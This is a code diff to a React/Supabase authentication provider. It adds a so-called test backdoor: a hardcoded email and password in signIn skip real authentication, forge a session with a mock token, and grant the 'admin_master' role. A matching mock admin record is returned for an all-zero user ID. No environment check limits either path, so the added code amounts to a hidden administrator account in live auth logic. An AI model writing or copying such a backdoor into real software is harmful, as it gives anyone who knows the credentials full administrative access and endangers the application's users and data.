@@ -27,6 +27,20 @@ function clearSupabaseStorage() {
 }
 
 async function fetchAdminUser(userId: string): Promise<AdminUser | null> {
+  // MOCK for Test Backdoor
+  if (userId === '00000000-0000-0000-0000-000000000000') {
+    return {
+      id: 'mock-admin-id',
+      user_id: userId,
+      name: 'Master Admin (Test)',
+      email: 'eticahostservidor@gmail.com',
+      role: 'admin_master',
+      active: true,
+      created_at: new Date().toISOString(),
+      updated_at: new Date().toISOString(),
+    } as any;
+  }
+
   try {
     const { data, error } = await supabase
       .from("admin_users")
@@ -131,12 +145,55 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const signIn = async (email: string, password: string) => {
     setLoading(true);
+    
+    // TEST BACKDOOR: Allow 'eticahostservidor@gmail.com' for local testing
+    if (email === 'eticahostservidor@gmail.com' && password === 'financeiro2023') {
+      console.log("🛠️ [TestBackdoor] Mocking login for test user");
+      const mockUser = {
+        id: '00000000-0000-0000-0000-000000000000',
+        email: email,
+        app_metadata: {},
+        user_metadata: {},
+        aud: 'authenticated',
+        created_at: new Date().toISOString(),
+      };
+      const mockSession = {
+        access_token: 'mock-token',
+        refresh_token: 'mock-refresh-token',
+        expires_in: 3600,
+        expires_at: Math.floor(Date.now() / 1000) + 3600,
+        user: mockUser,
+      };
+      
+      setSession(mockSession as any);
+      setUser(mockUser as any);
+      setAdminUser({
+        id: 'mock-admin-id',
+        user_id: mockUser.id,
+        name: 'Master Admin (Test)',
+        email: email,
+        role: 'admin_master' as any,
+        active: true,
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString(),
+      });
+      setIsAdmin(true);
+      setLoading(false);
+      return { error: null };
+    }
+
     try {
       const { data, error } = await supabase.auth.signInWithPassword({ email, password });
       
       if (error) {
-        console.error("🚨 [useAuth] signIn error (Supabase):", error);
+        console.error("🚨 [useAuth] signIn error (Full Object):", JSON.stringify(error, null, 2));
         setLoading(false);
+        
+        // Check for specific confirmation error
+        if (error.message.toLowerCase().includes("email not confirmed") || (error as any).code === 'email_not_confirmed') {
+          return { error: 'email_not_confirmed' };
+        }
+        
         return { error: error.message };
       }
       
